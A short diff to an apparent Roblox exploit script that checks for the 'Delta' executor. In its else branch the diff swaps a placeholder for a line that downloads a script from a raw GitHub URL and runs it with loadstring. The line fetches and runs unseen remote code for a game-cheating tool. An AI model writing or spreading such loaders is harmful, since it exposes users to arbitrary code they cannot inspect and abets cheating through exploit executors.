@@ -161,7 +161,7 @@ if executor == "Delta" then
         TeleportService:Teleport(game.PlaceId, player)
     end)
 else
-    loadstring(game:HttpGet("none"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/jazzedd/Scripts/refs/heads/main/dad"))()
 end
 
 pcall(function()
